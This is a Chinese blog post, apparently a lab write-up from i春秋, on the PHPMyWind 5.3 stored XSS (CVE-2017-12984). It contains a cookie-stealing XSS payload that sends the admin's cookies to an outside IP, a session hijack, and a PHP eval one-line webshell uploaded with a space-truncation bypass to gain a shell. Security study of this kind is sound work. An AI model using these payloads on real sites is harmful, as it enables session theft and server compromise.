<!DOCTYPE html>
<html lang=>
  <head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <meta name="description" content="">
  <meta name="keywords" content="root">
  
    <link rel="icon" href="/favicon.ico">
  
    
  <title>PHPMywind储存XSS漏洞 | The clown is laughing at you</title>
  <link rel="stylesheet" href="/style.css">
  <link rel="stylesheet" href="/lib/jquery.fancybox.min.css">
  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
</head>

<body>
  <header>
  <div class="header-container">
    <a class="logo" href="/">
      <span>The clown is laughing at you</span>
    </a>
    <ul class="right-header">
      
        <li class="nav-item">
          
            <a href="/" class="item-link">首页</a>
          
        </li>
      
        <li class="nav-item">
          
            <a href="/about" class="item-link">关于</a>
          
        </li>
      
        <li class="nav-item">
          
            <a href="/archives" class="item-link">归档</a>
          
        </li>
      
        <li class="nav-item">
          
            <a href="/tags" class="item-link">标签</a>
          
        </li>
      
    </ul>
  </div>
</header>

  <main id="post">
  <div class="content">
    <article>
        <section class="content markdown-body">
          <h1>PHPMywind储存XSS漏洞</h1>
          <div class="post-meta">
            <i class="fa fa-calendar" aria-hidden="true"></i> <time>2019/02/12</time>
            
            
          </div>
          <p>来自i春秋的PHPMywind储存XSS漏洞</p>
<p>学习储存XSS漏洞,在整个学习过程中，实际上还有文件上传漏洞，cookie欺骗等知识。</p>
<p>PHPMyWind 是一款基于PHP+MySQL开发的企业级建站引擎。相对于其他开源的企业CMS，这款建站程序突出的特点是易用，灵活，可拆分，所以它在中小型企业非常受欢迎。</p>
<p>PHPMyWind 5.3存储型XSS：漏洞公开时，PHPMyWind 5.3以及更早版本中存有存储型XSS漏洞，允许恶意访问者在客户留言处插入XSS利用语句，执行JS代码，从而获取网站管理员权限。漏洞存在于message_update.php文件中的content参数，漏洞CVE编号为（CVE-2017-12984 ）。</p>
<p><strong>0x01分析出现漏洞的原因</strong><br>看一下源码，处理客户留言内容的关键代码在message.php文件的第29行和34行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$content = htmlspecialchars($content);</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">$sql = &amp;quot;INSERT  INTO `#@__message` (siteid, nickname, contact, content, orderid, posttime, htop, rtop, checkinfo, ip) VALUES (1, &apos;$nickname&apos;, &apos;$contact&apos;, &apos;$content&apos;, &apos;$orderid&apos;, &apos;$posttime&apos;, &apos;&apos;, &apos;&apos;, &apos;false&apos;, &apos;$ip&apos;)&amp;quot;;</span><br></pre></td></tr></table></figure></p>
<p>看content参数，程序会使用htmlspecialchars() 函数把预定义的字符 “&lt;” （小于）和 “&gt;” （大于）转换为 HTML 实体，进行过滤，然后存储至数据库中</p>
<p>看看管理员修改留言的处理方式，代码在admin/ message_update.php文件的第26行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;lt;td&amp;gt;&amp;lt;input  type=&amp;quot;text&amp;quot;  name=&amp;quot;content&amp;quot;  id=&amp;quot;content&amp;quot;  class=&amp;quot;input&amp;quot;  value=&amp;quot;&amp;lt;?php  echo  $row[&apos;content&apos;] ?&amp;gt;&amp;quot; /&amp;gt;&amp;lt;/td&amp;gt;</span><br></pre></td></tr></table></figure></p>
<p>管理员编辑留言，编辑器直接读取content内容并显示，却并未进行转义操作，所以导致存储型XSS漏洞的出现</p>
<p>登录该网站<br>    <code>www.test.ichunqiu:8080</code><br>到客户留言页面下，输入<br>    <code>&lt;img src=x onerror=alert(666)&gt;</code><br>提交信息<br><img src="/2019/02/12/PHPMywind储存XSS漏洞/1.jpg" alt="1"></p>
<p>这时候假装我们是管理员，登录后台，账号密码是admin，然后查看留言，并修改留言,发现存在漏洞<br><img src="/2019/02/12/PHPMywind储存XSS漏洞/2.jpg" alt="2"></p>
<p>这时候利用xss漏洞，获取cookie值，输入<br>    <code>&lt;img src=x
    onerror=document.body.appendChild.creatElement(&#39;img&#39;)).setAttribute(&#39;src&#39;,&#39;http://172.16.11.2:8888/?=&#39;+document.cookie)&gt;</code><br>当管理员修改该留言时，将会从8888端口反弹出cookie值，然后我们需要打开netcat监听该端口反弹出的cookie值。<br>个人觉得这段代码可以学习一下，挺有借鉴意义的<br><img src="/2019/02/12/PHPMywind储存XSS漏洞/3.jpg" alt="3"></p>
<p>记录该cookie值中的PHPSESSION<br><strong>关于cookie的PHPSESSION，这一块的知识点还有点了解</strong><br>然后使用firefox，登录<br><code>www.test.ichunqiu:8080/admin/default.php</code><br>这时会回到登录页面，然后修改其cookie值，使用我们之前记录的cookie值，路径为/admin,然后刷新页面，就能登录到后台<br><img src="/2019/02/12/PHPMywind储存XSS漏洞/4.jpg" alt="4"><br><img src="/2019/02/12/PHPMywind储存XSS漏洞/5.jpg" alt="5"><br>修改上传文件管理这一项<strong>|php |（有空格）</strong>.<br><img src="/2019/02/12/PHPMywind储存XSS漏洞/7.jpg" alt="7"><br>编写一段一句话木马<br>    <code>&lt;?php @eval($_POST[&#39;c&#39;]); ?&gt;</code><br>然后文件名保存为  yijuhua.png<br>通过burp抓包绕过上传限制，修改文件名’yijuhua.php ‘<strong>(有空格)</strong><br><img src="/2019/02/12/PHPMywind储存XSS漏洞/9.jpg" alt="9"><br><img src="/2019/02/12/PHPMywind储存XSS漏洞/8.jpg" alt="8"><br><img src="/2019/02/12/PHPMywind储存XSS漏洞/10.jpg" alt="10"><br>然后用菜刀连上，就能getshell。<br><img src="/2019/02/12/PHPMywind储存XSS漏洞/6.jpg" alt="6"></p>
<p>在这里有几个小问题，好像挺白痴的，问给自己的：<br> (1)上传文件处，为何要修改成|php |,然后再上传文件时，需要抓包修改文件名为yijuhua.php ,的原理还不是很懂。<br> (2)netcat的使用还需加强。<br> (3)php代码的审计能力还需要加强。</p>
<p>这里先解决第一个问题：关于文件上传漏洞，这是一个绕过的方法，<strong>空格截断</strong></p>
<p>实验的解释是：<br><img src="/2019/02/12/PHPMywind储存XSS漏洞/11.png" alt="11"><br>其实也很好理解，当我们上传一句话木马yijuhua.php，如果不加空格做截断处理的话，上传后的文件就是yijuhua.php.png，服务器将会自动添加一个后缀名。反之，将会上传yijuhua.php，空格将后面的内容给吞掉了。</p>

        </section>
    </article>
    
        <!-- disqus 评论框 start -->
        <div class="comment">
            <div id="disqus_thread" class="disqus-thread">
              <i>Loading comments box needs to over the wall</i>
            </div>
        </div>
        <!-- disqus 评论框 end -->
    
    
        <!-- livere 评论框 start -->
        <div class="comment">
            <div id="lv-container" data-id="city" data-uid="your_livere_uid"></div>
        </div>
        <!-- livere 评论框 end -->
        
  </div>
  <aside>
    
  </aside>
</main>

<!-- disqus 公共JS代码 -->
<script type="text/javascript">
  /* * * CONFIGURATION VARIABLES * * */
  var disqus_shortname = "your_disqus_shortname";
  var disqus_identifier = "http://yoursite.com/2019/02/12/PHPMywind储存XSS漏洞/";
  var disqus_url = "http://yoursite.com/2019/02/12/PHPMywind储存XSS漏洞/";

  isAgent(getDisqus)

  // determine user agent in China
  function isAgent(cb) {
    var url = '//graph.facebook.com/feed?callback=h';
    var xhr = new XMLHttpRequest();
    var called = false;
    xhr.open('GET', url);
    xhr.onreadystatechange = function() {
      if (xhr.readyState === 4 && xhr.status === 200) {
      called = true;
      cb(true);
      }
    };
    xhr.send();
    // timeout 1s, this facebook API is very fast.
    setTimeout(function() {
      if (!called) {
      xhr.abort();
      cb(false)
      }
    }, 1000);
  }

  function getDisqus(isAgent) {
    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; 
    dsq.async = true
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq)
  }
</script>
<!-- disqus 公共JS代码 end -->


<script type="text/javascript">
  (function(d, s) {
      var j, e = d.getElementsByTagName(s)[0];

      if (typeof LivereTower === 'function') { return; }

      j = d.createElement(s);
      j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
      j.async = true;

      e.parentNode.insertBefore(j, e);
  })(document, 'script');
</script>


  <footer>
  <div class="copyright">
    <div>
      &copy; 2019 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a>&nbsp
    </div>
    <div>
      Theme by <a href="https://github.com/lewis-geek/hexo-theme-Aath" target="_blank">Aath</a>
    </div>
  </div>
</footer>


<script src="https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
<script src="/lib/in-view.min.js"></script>
<script src="/lib/lodash.min.js"></script>
<script>
  var isDown = true
  var oldY = 0
  inView.offset(50)

  document.body.addEventListener('touchstart', function(){});
  
  window.addEventListener('scroll', _.throttle(e => {
    var currentY = window.scrollY
    if((oldY - currentY) < 0) {
      isDown = true
    } else {
      isDown = false
    }
    oldY = currentY
  }, 250))

  $("article img").each(function() {
      var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
      $(this).wrapAll(strA);
  });

  $('.toc-link').each(function() {
      var href = $(this).attr("href");
      
      inView(href).on('exit', () => {
        if (isDown) {
          handleActive(href)
        }
      })

      inView(href).on('enter', () => {
        if (!isDown) {
          handleActive(href)
        }
      })

      this.onclick = function(e) {
        var pos = $(href).offset().top - 10;
        $("html,body").animate({scrollTop: pos}, 300);
        setTimeout(() => {
          handleActive(href)
        }, 350)
        return false
      }
  })

  function handleActive(href) {
    document.querySelectorAll('.toc-link').forEach(elm => {
      elm.classList.remove('active')
    })
    document.querySelector(".toc [href='"+ href +"']").classList.add('active')
  }
</script>
<script src="/lib/jquery.fancybox.min.js"></script>


</body>
</html>
